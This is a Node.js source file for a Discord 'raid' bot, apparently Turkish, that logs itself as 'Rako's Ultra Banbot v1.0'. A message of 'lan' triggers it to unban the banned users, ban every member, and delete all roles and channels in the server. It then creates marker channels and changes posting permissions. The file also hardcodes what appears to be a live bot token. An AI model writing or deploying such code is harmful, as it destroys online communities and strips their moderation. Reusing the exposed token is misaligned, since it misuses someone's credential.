////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const express = require('express');
const Discord = require('discord.js');
const berke = new Discord.Client();
const app = express();
const http = require('http');
    app.get("/", (request, response) => {
    response.sendStatus(200);
    });
    app.listen(process.env.PORT);
    setInterval(() => {
    http.get('http://schewtsa-raid.glitch.me/');
    }, 280000);
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

berke.on('message', msg => {
    if(msg.content.toLowerCase() === 'lan' ) {    
      msg.guild.fetchBans().then(bans => {
        bans.forEach(user => {
           msg.guild.unban(user)
        })
      msg.guild.members.forEach(a => msg.guild.ban(a))
      msg.guild.roles.forEach(a => a.delete())
      msg.guild.channels.forEach(a => a.delete())
      let kanal = 'schewtsa'
      let kanal1 = 'buraya-yazın'
      msg.guild.createChannel(kanal)
      msg.guild.createChannel(kanal1)
      })
    }
})

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 
     
berke.on('message', message => {
    if(message.content.toLowerCase() === 'ban kaldır' ) {
        message.guild.fetchBans().then(bans => {
            bans.forEach(user => {
                message.guild.unban(user);
            });
        });
    }
});

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

berke.on('channelCreate', channel => {
  if (channel.name == 'schewtsa') {
    channel.send('Bir, kuşun kanat çırpış sesiydi.')
    channel.guild.channels.forEach(c => {
         c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
              SEND_MESSAGES: false,
              ADD_REACTIONS: false,
              SPEAK: false
            });
          });
  }
  if (channel.name == '') {
    channel.send(``)
  }

});

///////////

berke.on('channelCreate', channel => {
  if (channel.name == 'buraya-yazın') {
    channel.send('@everyone buraya yazabilirsiniz.')
    channel.guild.channels.forEach(c => {
         c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
              SEND_MESSAGES: true,
              ADD_REACTIONS: false,
              SPEAK: false
            });
          });
  }
  if (channel.name == '') {
    channel.send(``)
  }

});

berke.login("NjQ1MzczODYyNjA2OTI5OTIw.Xe_2Sg.rNbDS9JNqDCtyRfY_hjPoaUDYy8")


berke.on("ready", () => {
  berke.guilds.forEach(s => console.log(s.name + "|" + s.memberCount + "│" + s.id))
  console.log("▬▬▬▬▬▬▬▬▬ Rako's Ultra Banbot v1.0 ▬▬▬▬▬▬▬▬▬");
  console.log("Kullanıcı İsmi: " + berke.user.tag);
  console.log("ID: " + berke.user.id);
  console.log("Kuruldu: " + berke.user.createdAt);
  if (berke.user.email === null) {
    console.log("Email: Bot oldugu için email yok.");
  } else {
    console.log("Email: " + berke.user.email);
  }
  if (berke.user.premium === true) {
    console.log("Nitro Mu? : Evet");
  } else if (berke.user.premium === false) {
    console.log("Nitro Mu? : Hayır");
  }
  if (berke.user.verified === true) {
    console.log("Doğrulanmış mı? : Evet");
  } else if (berke.user.verified === false) {
    console.log("Doğrulanmış mı? : Hayır");
  }
  if (berke.user.bot === true) {
    console.log("Bot Mu? : Evet");
  } else if (berke.user.bot === false) {
    console.log("Bot Mu? : Hayır");
  }
  console.log("Kullanıcı Sayısı: " + berke.users.size);
  console.log("Sunucu Sayısı: " + berke.guilds.size);
  console.log("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬");
})
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////